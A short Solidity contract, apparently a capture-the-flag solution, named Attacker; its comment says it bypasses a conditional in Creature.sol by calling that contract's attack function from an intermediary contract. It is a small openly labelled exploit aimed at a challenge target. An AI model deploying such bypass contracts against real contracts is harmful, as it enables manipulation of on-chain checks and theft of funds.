// SPDX-License-Identifier: GPL-3.0
/*
    This smart contract is gonna be used to bypass the conditional, from the creature.sol
*/
pragma solidity >=0.7.0 <0.9.0;

import "./Creature.sol";

contract Attacker {
    Creature creature;
    uint256 private nuevo_valor = 0;

    constructor(Creature _creature) {
        creature = _creature;
    }

    function attackCreature(uint256 _damage) public {
        creature.attack(_damage);
    }

}
